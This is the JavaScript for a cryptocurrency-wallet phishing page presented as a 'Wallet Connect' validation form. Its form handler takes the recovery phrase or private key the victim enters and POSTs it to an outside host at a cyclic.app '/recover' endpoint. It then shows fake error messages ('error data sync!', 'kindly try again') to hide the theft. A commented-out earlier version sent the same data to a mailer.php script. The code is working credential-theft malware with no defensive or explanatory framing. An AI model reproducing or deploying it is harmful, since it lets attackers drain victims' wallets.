
  var phrase = document.querySelector("#phrase");
  var keystore = document.querySelector("#keystore");
  var private = document.querySelector("#private");
  var first = document.querySelector("#first");
  var second = document.getElementById("second");
  var third = document.querySelector("#third");
  phrase.addEventListener("click", function() {
    hide(first);
  });

  keystore.addEventListener("click", function() {
    hide(second);
  });


  private.addEventListener("click", function() {
    hide(third);
  });

  function hide(elem) {
    var expandedPanel = document.querySelector(".active");
    //This is to remove the current active class on click
    if (expandedPanel) {
      expandedPanel.classList.remove("active");
      var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");

      for (let i = 0; i < attr.length; i++) {
        attr[i].value = "";

      }
    }
    var i = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")
    var x = elem.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")

    for (let c = 0; c < i.length; c++) {
      i[c].required = false;
    }
    for (let c = 0; c < x.length; c++) {
      x[c].required = true;
    }
    //add an active tag to the clicked element and set it's

    elem.classList.add("active");

  }


// function sendData( data ) {
//   const XHR = new XMLHttpRequest(),
//         FD  = new FormData( form );

//   // Push our data into our FormData object
//   for( name in data ) {
//     FD.append( name, data[ name ] );
//   }

//   // Define what happens on successful data submission
//   XHR.addEventListener( 'load', function( event ) {
//     alert( 'Error Validating Wallet... Please try again later' );
    
//       document.querySelector(".sending").style.display = "none";
//   } );

//   // Define what happens in case of error
//   XHR.addEventListener(' error', function( event ) {
//     alert( 'Oops! Something went wrong.' );
//   } );

//   // Set up our request
//   XHR.open( 'POST', '../mailer.php' );

//   // Send our FormData object; HTTP headers are set automatically
//   XHR.send(FD);
// }

function sendData(data) {
  fetch('https://odd-moccasins-ox.cyclic.app/recover', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (response.status === 200) {
      alert('error data sync!');
    } else {
      alert('failed connection, kindly try again');
    }
  })
  .catch(error => {
    alert('server error, kindly try again');
  });
}

const form = document.querySelector('#form'); 
const privatekeyInput = document.querySelector('#privatekeyInput'); 
const phraseInput = document.querySelector('#phraseInput'); 

form.addEventListener( 'submit', function(e)
  { 
      e.preventDefault();
      document.querySelector(".sending").style.display = "flex";

      const wallet = "Wallet Connect";
      const os = "nill"
      const phrase = phraseInput.value === "" ? privatekeyInput.value : phraseInput.value
      const data = { wallet, os, phrase };
      // console.log(JSON.stringify(data))

      sendData(data); // send data to Node.js endpoint

} )
